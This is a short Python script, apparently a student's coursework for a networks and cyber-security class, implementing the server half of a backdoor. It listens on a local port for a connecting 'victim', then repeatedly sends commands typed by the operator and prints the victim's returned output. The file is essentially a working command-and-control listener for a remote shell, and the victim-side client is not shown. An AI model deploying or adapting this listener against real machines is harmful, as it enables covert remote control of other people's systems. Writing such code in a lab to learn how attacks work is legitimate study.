# Muhammad Huzaifa
# 20i0604
# Server.py
# Networks and Cyber II

import socket
import threading# importing libraries
from termcolor import colored

my_ip = '127.0.0.1'# ip to bind with
port = 4449
server = socket.socket()# creating socket
server.bind((my_ip, port))# binding to the ip and port
print('[+] Server Started')
print('[+] Listening For Victim')
server.listen(1)# listening for the client to connet
victim, victim_addr = server.accept()   # Accepting the connection from client
print(f'[+] {victim_addr} Victim opened the backdoor')

# Executing the commands on client until server exits by itself
while True:
    # Getting Commands from user
    command = input('Enter Command : ')
    command = command.encode()# Encoding command
    victim.send(command)# Sending command to the victim
    print('[+] Command sent')
    #while True:
    victim.settimeout(1)
    try:
    	output = victim.recv(4096)# Recieving Command Output
    	print(colored(f"Output: {output}", 'green'))# Printing command output onto the screen
    except socket.timeout:
    	continue
